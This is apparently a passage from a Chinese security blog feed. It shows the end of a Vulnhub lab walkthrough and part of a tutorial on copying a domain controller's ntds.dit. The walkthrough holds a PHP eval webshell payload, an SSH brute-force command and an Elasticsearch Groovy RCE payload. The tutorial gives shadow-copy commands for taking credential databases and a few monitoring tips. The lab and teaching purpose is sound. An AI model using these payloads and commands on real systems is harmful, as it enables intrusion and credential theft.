class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌─[user@parrot]─[~]</span><br><span class="line">└──╼ $sudo nmap -p80 192.168.56.102</span><br><span class="line">[sudo] password for user: </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-19 06:22 BST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.102</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:81:9F:44 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds</span><br></pre></td></tr></table></figure><h2 id="0x04-访问80端口"><a href="#0x04-访问80端口" class="headerlink" title="0x04.访问80端口"></a>0x04.访问80端口</h2><p><code>发现?file=page1.html，直接测试文件包含</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919134056565.png" class><p><code>文件包含存在，利用php为协议包含一句话木马</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919134159182.png" class><h2 id="0x05-蚁剑连接"><a href="#0x05-蚁剑连接" class="headerlink" title="0x05.蚁剑连接"></a>0x05.蚁剑连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919140548766.png" class><h2 id="0x06-内网渗透"><a href="#0x06-内网渗透" class="headerlink" title="0x06.内网渗透"></a>0x06.内网渗透</h2><p><code>根据提示，内网中存在一台任务靶机</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919140716899.png" class><p><code>查看当前靶机内网ip为172.17.0.3</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919140927665.png" class><p><code>使用venom搭建socks代理进行内网穿透，首先上传venom客户端</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919141831153.png" class><p><code>服务端监听6666端口</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919141604042.png" class><p><code>客户端回连，构建代理</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919142233220.png" class><p><code>proxychains添加代理链</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919142655310.png" class><p><code>内网主机发现，发现172.17.0.4的80端口开放</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919143306102.png" class><h2 id="0x07-访问172-17-0-4"><a href="#0x07-访问172-17-0-4" class="headerlink" title="0x07.访问172.17.0.4"></a>0x07.访问172.17.0.4</h2><p><code>设置代理，访问172.17.0.4</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919143801325.png" class><p><code>可以上传文件，并且需要密码，接下来进行爆破(bp同样设置代理)，密码为password</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919150345618.png" class><h2 id="0x08-上传webshell"><a href="#0x08-上传webshell" class="headerlink" title="0x08.上传webshell"></a>0x08.上传webshell</h2><img src="/2021/09/19/MoriatyCorp/image-20210919150522943.png" class><h2 id="0x09-冰蝎连接"><a href="#0x09-冰蝎连接" class="headerlink" title="0x09.冰蝎连接"></a>0x09.冰蝎连接</h2><p><code>得到flag</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919150724877.png" class><h2 id="0x10-爆破ssh"><a href="#0x10-爆破ssh" class="headerlink" title="0x10.爆破ssh"></a>0x10.爆破ssh</h2><p><code>根据提示，给出了用户名与hash值，使用Hydra进行爆破，首先发现目标主机</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919151013459.png" class><p><code>发现目标主机172.17.0.6</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919151317025.png" class><p><code>爆破，将明文用户名与密码写入文件(hash值明文都是弱口令，直接网上搜索即可得到)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌─[✗]─[user@parrot]─[~]</span><br><span class="line">└──╼ $cat user</span><br><span class="line">root</span><br><span class="line">toor</span><br><span class="line">admin</span><br><span class="line">mcorp</span><br><span class="line">moriarty</span><br><span class="line">┌─[user@parrot]─[~]</span><br><span class="line">└──╼ $cat pass </span><br><span class="line">root</span><br><span class="line">toor</span><br><span class="line">password</span><br><span class="line">admin</span><br><span class="line">guest</span><br><span class="line">MORIARTY</span><br><span class="line">MCORP</span><br><span class="line">mcorp</span><br><span class="line">weapons</span><br><span class="line">moriarty</span><br><span class="line">┌─[user@parrot]─[~]</span><br><span class="line">└──╼ $proxychains hydra -L user  -P pass ssh://172.17.0.6</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919152205364.png" class><h2 id="0x11-登入"><a href="#0x11-登入" class="headerlink" title="0x11.登入"></a>0x11.登入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh root@172.17.0.6</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919152340149.png" class><h2 id="0x12-继续扫描内网"><a href="#0x12-继续扫描内网" class="headerlink" title="0x12.继续扫描内网"></a>0x12.继续扫描内网</h2><p><code>根据提示，继续扫描内网</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919152715932.png" class><img src="/2021/09/19/MoriatyCorp/image-20210919152744544.png" class><p><code>访问172.17.0.7的8000端口，发现可修改用户密码，抓包尝试修改admin密码，修改成功</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919153811111.png" class><p><code>使用admin登入</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919154031962.png" class><h2 id="0x13-扫描9200端口"><a href="#0x13-扫描9200端口" class="headerlink" title="0x13.扫描9200端口"></a>0x13.扫描9200端口</h2><p><code>根据提示，内网中存在一台Elasticsearch服务器，Elasticsearch的端口为9200</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919154255839.png" class><p><code>扫描9200端口</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919154612698.png" class><p><code>访问172.17.0.8的9200端口</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919160606795.png" class><h2 id="0x14-利用"><a href="#0x14-利用" class="headerlink" title="0x14.利用"></a>0x14.利用</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc4NDA1Ni9hcnRpY2xlL2RldGFpbHMvMTA1ODc3NDAx">参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;  &quot;name&quot;: &quot;kjsx&quot;&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919160739682.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;ls\&quot;).getText()&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/19/MoriatyCorp/image-20210919160814798.png" class><img src="/2021/09/19/MoriatyCorp/image-20210919160940650.png" class><img src="/2021/09/19/MoriatyCorp/image-20210919161011521.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-官网描述&quot;&gt;&lt;a href=&quot;#0x00-官网描述&quot; class=&quot;headerlink&quot; title=&quot;0x00.官网描述&quot;&gt;&lt;/a&gt;0x00.官网描述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Hello Agent.&lt;/p&gt;
&lt;p&gt;You’re here on a special mission.&lt;/p&gt;
&lt;p&gt;A mission to take down one of the biggest weapons suppliers which is Moriarty Corp.&lt;/p&gt;
&lt;p&gt;Enter flag{start} into the webapp to get started!&lt;/p&gt;
&lt;p&gt;Notes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web panel is on port 8000 (not in scope. Don’t attack)&lt;/li&gt;
&lt;li&gt;Flags are stored in #_flag.txt format. Flags are entered in flag{} format. They’re usually stored in / directory but can be in different locations.&lt;/li&gt;
&lt;li&gt;To temporarily stop playing, pause the VM. Do not shut it down.&lt;/li&gt;
&lt;li&gt;The webapp starts docker containers in the background when you add flags. Shutting down and rebooting will mess it up.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(the story is bad. sorry for the lack of creativity)&lt;/p&gt;
&lt;p&gt;Difficulty: Med-Hard&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透测试-域控制器安全</title>
    <link href="https://lunamoore.github.io/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <id>https://lunamoore.github.io/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/</id>
    <published>2021-09-06T12:36:48.000Z</published>
    <updated>2021-09-06T12:38:08.077Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在通常情况下、即使拥有管理员权限,也无法读取域控制器中的C:\Windwos\NTDS\ntds.dit文件(活动目录始终访问这个文件，所以文件被禁止读取)。使用Windows本地卷影拷贝服务可以获得文件的副本。</p></blockquote><h2 id="0x01-域控中-卷影拷贝服务提取ntds-dit"><a href="#0x01-域控中-卷影拷贝服务提取ntds-dit" class="headerlink" title="0x01.(域控中)卷影拷贝服务提取ntds.dit"></a>0x01.(域控中)卷影拷贝服务提取ntds.dit</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在活动目录中,所有的数据都保存在 ntds.dit文件中。ntds.dit是一个二进制文件,存储位置为域控制器的%SystemRoot%ntds\ntds.dit。ntds.dit 中包含(但不限于)用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM文件一样，是被Windows操作系统锁定的。本节将介绍如何从系统中导出ntds.dit,以及如何读取ntds.dit中的信息。在一般情况下,系统运维人员会利用卷影拷贝服务（Volume Shadow Copy Service, VSS）实现这些操作。VSS本质上属快照（Snapshot)技术的一种，主要用于备份和恢复（即使目标文件处于锁定状态）。</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-使用ntdsutil-exe提取ntds-dit"><a href="#1-使用ntdsutil-exe提取ntds-dit" class="headerlink" title="1.使用ntdsutil.exe提取ntds.dit"></a>1.使用ntdsutil.exe提取ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用 ntdsutil.exe,可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导(DCPromo.exe）成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上、可以在域控制器上直接操作，也可以通过域内机器在域控制器上远程操作。ntdsutil.exe支持的操作系统有 Windows Server 2003、 Windows Server 2008、 Windows Server 2012。</span><br></pre></td></tr></table></figure><p><code>首先创建快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p><code>然后加载快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><code>复制到c盘</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202109041806_VOLUMEC$\Windows\NTDS\ntds.dit C:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>卸载快照并删除</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; &quot;delete &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><code>列出所有快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure><h3 id="2-使用vssadmin提取ntds-dit"><a href="#2-使用vssadmin提取ntds-dit" class="headerlink" title="2.使用vssadmin提取ntds.dit"></a>2.使用vssadmin提取ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadminn是 Windows Server 2008 &amp; Windows 7提供的VSS管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息（只能管理系统 Provider创建的卷影拷贝)、显示已安装的所有卷影拷贝写入程序（writers)和提供程序（providers),以及改变卷影拷贝的存储空间(即所谓的“diff空间”)的大小等。vssadminn 的操作流程和ntdsutil类似</span><br></pre></td></tr></table></figure><p><code>首先创建一个c盘的卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure><p><code>复制出来</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>删除快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure><p><code>列出所有卷影副本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin List Shadows</span><br></pre></td></tr></table></figure><h3 id="3-使用vssown-vbs脚本提取ntds-dit"><a href="#3-使用vssown-vbs脚本提取ntds-dit" class="headerlink" title="3.使用vssown.vbs脚本提取ntds.dit"></a>3.使用vssown.vbs脚本提取ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssown.vbs脚本的功能和vssadmin类似。vssown.vbs 脚本是由Tim Tomes开发的，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务。可以在命令行环境中执行该脚本。</span><br></pre></td></tr></table></figure><p><code>启动卷影拷贝服务</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure><p><code>创建一个c盘的卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure><p><code>列出卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure><p><code>复制</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>删除卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /delete &#123;17EDE50A-A1B1-48E5-B206-9FA13FED03F0&#125;</span><br></pre></td></tr></table></figure><h3 id="4-使用ntdsutil的iFM创建卷影拷贝"><a href="#4-使用ntdsutil的iFM创建卷影拷贝" class="headerlink" title="4.使用ntdsutil的iFM创建卷影拷贝"></a>4.使用ntdsutil的iFM创建卷影拷贝</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">除了按照前面介绍的方法通过执行命令来提取ntds dit,也可以使用创建一个 IFM的方式获取nsdi。在使用ntdsutil创建IFM时，需要进行生成快照、加载、将ntds. dit和计算机的SAM文件复制到目标文件夹中等操作。这些操作也可以通过PowerShell或WMI远程执行</span><br></pre></td></tr></table></figure><p><code>域控管理员输入如下命令</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/demo&quot; quit quit</span><br><span class="line"></span><br><span class="line">C:\&gt;ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/demo&quot; quit quit</span><br><span class="line">ntdsutil: ac i ntds</span><br><span class="line">活动实例设置为“ntds”。</span><br><span class="line">ntdsutil: ifm</span><br><span class="line">ifm: create full c:/demo</span><br><span class="line">正在创建快照...</span><br><span class="line">成功生成快照集 &#123;65b13a1d-a952-4257-8255-46531847bb28&#125;。</span><br><span class="line">快照 &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125; 已作为 C:\$SNAP_202109041835_VOLUMEC$\ 装载</span><br><span class="line">已装载快照 &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125;。</span><br><span class="line">正在启动碎片整理模式...</span><br><span class="line">     源数据库: C:\$SNAP_202109041835_VOLUMEC$\Windows\NTDS\ntds.dit</span><br><span class="line">     目标数据库: c:\demo\Active Directory\ntds.dit</span><br><span class="line"></span><br><span class="line">                  Defragmentation  Status (omplete)</span><br><span class="line"></span><br><span class="line">          0    10   20   30   40   50   60   70   80   90  100</span><br><span class="line">          |----|----|----|----|----|----|----|----|----|----|</span><br><span class="line">          ...................................................</span><br><span class="line"></span><br><span class="line">正在复制注册表文件...</span><br><span class="line">正在复制 c:\demo\registry\SYSTEM</span><br><span class="line">正在复制 c:\demo\registry\SECURITY</span><br><span class="line">快照 &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125; 已卸载。</span><br><span class="line">在 c:\demo 中成功创建 IFM 媒体。</span><br><span class="line">ifm: quit</span><br><span class="line">ntdsutil: quit</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure><p><code>在Active Directory目录下可以看到ntds.dit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\demo\Active Directory&gt;dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 FC34-99CE</span><br><span class="line"></span><br><span class="line"> C:\demo\Active Directory 的目录</span><br><span class="line"></span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          .</span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          ..</span><br><span class="line">2021/09/04  18:35        25,165,824 ntds.dit</span><br><span class="line">2021/09/04  18:35            16,384 ntds.jfm</span><br><span class="line">               2 个文件     25,182,208 字节</span><br><span class="line">               2 个目录 52,228,857,856 可用字节</span><br><span class="line"></span><br><span class="line">C:\demo\Active Directory&gt;</span><br></pre></td></tr></table></figure><p><code>SYSTEM与SECURITY在registry目录下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\demo\registry&gt;dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 FC34-99CE</span><br><span class="line"></span><br><span class="line"> C:\demo\registry 的目录</span><br><span class="line"></span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          .</span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          ..</span><br><span class="line">2021/07/22  14:23            65,536 SECURITY</span><br><span class="line">2021/07/22  14:23        18,087,936 SYSTEM</span><br><span class="line">               2 个文件     18,153,472 字节</span><br><span class="line">               2 个目录 52,219,453,440 可用字节</span><br><span class="line"></span><br><span class="line">C:\demo\registry&gt;</span><br></pre></td></tr></table></figure><p><code>删除</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir /s /q demo</span><br></pre></td></tr></table></figure><p><code>nishang中的copy-vss.ps1脚本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\test&gt; Import-Module .\Copy-VSS.ps1</span><br><span class="line">PS C:\test&gt; Copy-VSS</span><br><span class="line">已复制         1 个文件。</span><br><span class="line">已复制         1 个文件。</span><br><span class="line">已复制         1 个文件。</span><br><span class="line">PS C:\test&gt;</span><br></pre></td></tr></table></figure><h3 id="5-使用diskshadow导出ntds-dit"><a href="#5-使用diskshadow导出ntds-dit" class="headerlink" title="5.使用diskshadow导出ntds.dit"></a>5.使用diskshadow导出ntds.dit</h3><p><code>首先进入diskshadow</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;diskshadow</span><br></pre></td></tr></table></figure><p><code>设置卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br></pre></td></tr></table></figure><p><code>添加卷</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add volume c: alias someAlias</span><br></pre></td></tr></table></figure><p><code>创建快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create</span><br></pre></td></tr></table></figure><p><code>分配虚拟磁盘盘符</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expose %someAlias% k:</span><br></pre></td></tr></table></figure><p><code>复制ntds.dit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;C:\Windows\System32\cmd.exe&quot; /c copy F:\Windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>删除所有快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete shadows all </span><br></pre></td></tr></table></figure><p><code>列出系统中所有的卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list shadows all</span><br></pre></td></tr></table></figure><p><code>重置</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure><p><code>退出</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">导出ntds.dit后，可以将system, hive转储。因为system.hive中存放着ntds.dit的密钥，所以如果没有该密钥，将无法查看ntds.dit中的信息</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\windows\temp\system.hive</span><br></pre></td></tr></table></figure><h3 id="6-监控卷影拷贝服务的使用情况"><a href="#6-监控卷影拷贝服务的使用情况" class="headerlink" title="6.监控卷影拷贝服务的使用情况"></a>6.监控卷影拷贝服务的使用情况</h3><p><code>通过监控卷影拷贝服务的使用情况，可以及时发现攻击者在系统中进行的一些恶意操作。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监控卷影拷贝服务及任何涉及活动目录数据库文件(ntds.dit)的可疑操作行为。</span><br><span class="line">监控System Event ID 7036(卷影拷贝服务进人运行状态的标志)的可疑实例，以及创建vssvc.exe进程的事件。</span><br><span class="line">监控创建dkshndko.exe及相关子进程的事件。</span><br><span class="line">监控客户端设备中的diskshadow.exe实例创建事件。除非业务需要， 在Windows操作系统中不应该出现diskshadow.exe.如果发现，应立刻将其删除。</span><br><span class="line">通过日志监控新出现的逻辑驱动器映射事件。</span><br></pre></td></tr></table></figure><h2 id="0x02-导出ntds-dit中的散列值"><a href="#0x02-导出ntds-dit中的散列值" class="headerlink" title="0x02.导出ntds.dit中的散列值"></a>0x02.导出ntds.dit中的散列值</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实验环境为kali，将导出的ntds.dit放入kali中进行解析</span><br></pre></td></tr></table></figure><h3 id="1-使用esedbexport恢复ntds-dit"><a href="#1-使用esedbexport恢复ntds-dit" class="headerlink" title="1.使用esedbexport恢复ntds.dit"></a>1.使用esedbexport恢复ntds.dit</h3><h4 id="01-导出ntds-dit"><a href="#01-导出ntds-dit" class="headerlink" title="01.导出ntds.dit"></a>01.导出ntds.dit</h4><p><code>安装依赖</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install autoconf automake autopoint libtool pkg-config -y</span><br></pre></td></tr></table></figure><p><code>安装libesedb</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install </span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure><p><code>安装成功之后，/usr/local/bin目录下就可以看到esedbexport</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/local/bin]</span><br><span class="line">└─# ls      </span><br><span class="line">chardetect  esedbexport  esedbinfo  nokogiri  pip  pip2  pip2.7  pip3  pip3.9  ssr  wheel</span><br></pre></td></tr></table></figure><p><code>提取表信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure><p><code>导出表信息，本实验只需要datatable和link_table</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/demo]└─# lsntds.dit  ntds.dit.export                                                                                                                                    ┌──(root💀kali)-[~/demo]└─# cd ntds.dit.export                                                                                                                                   ┌──(root💀kali)-[~/demo/ntds.dit.export]└─# ls -l 总用量 12772-rw-r--r-- 1 root root 12551192  9月  4 21:15 datatable.4-rw-r--r-- 1 root root      728  9月  4 21:15 hiddentable.6-rw-r--r-- 1 root root      263  9月  4 21:15 link_history_table.10-rw-r--r-- 1 root 